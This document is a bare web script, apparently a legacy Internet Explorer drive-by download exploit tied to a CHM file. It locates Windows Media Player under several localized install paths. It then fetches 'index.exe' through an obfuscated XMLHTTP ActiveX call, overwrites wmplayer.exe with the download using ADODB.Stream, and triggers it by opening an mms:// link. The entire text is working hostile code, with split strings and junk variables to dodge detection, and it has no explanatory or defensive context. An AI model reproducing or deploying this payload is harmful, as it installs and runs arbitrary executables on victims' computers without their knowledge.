   <script language="vbscript">
       Function Exists(filename)
           On Error Resume Next
           LoadPicture(filename)
           Exists = Err.Number =  481
       End Function
   </script>

   <script language="javascript">
       wmplayerpaths= [
               "C:\\Programmer\\Windows Media Player\\wmplayer.exe",
               "C:\\Program\\Windows Media Player\\wmplayer.exe",
               "C:\\Programme\\Windows Media Player\\wmplayer.exe",
               "C:\\Programmi\\Windows Media Player\\wmplayer.exe",
               "C:\\Programfiler\\Windows Media Player\\wmplayer.exe",
               "C:\\Programas\\Windows Media Player\\wmplayer.exe",
               "C:\\Archivos de programa\\Windows Media Player\\wmplayer.exe",
               "C:\\Program Files\\Windows Media Player\\wmplayer.exe"
              ];

       for (i=0;i<wmplayerpaths.length;i++) {
           wmplayerpath = wmplayerpaths[i];
           if (Exists(wmplayerpath))
               break;
       }

       function getPath(url) {

           start = url.indexOf('http:')
           end = url.indexOf('index.chm')
           aaaa="ffff";
           cab="bca";
           return url.substring(start, end);
       }

       payloadURL = getPath(location.href)+'index.exe';
       SDS="icrosoft.XMLHT";
       var x = new ActiveXObject("M"+SDS+"TP");
       x.Open("GET",payloadURL,0);
       x.Send();

       var s = new ActiveXObject("ADODB.Stream");
       s.Mode = 3;
       PP="1"
       s.Type = 1;
       s.Open();
       s.Write(x.responseBody);

       s.SaveToFile(wmplayerpath,2);
       PP="1"
       location.href = "mms://";

   </script>
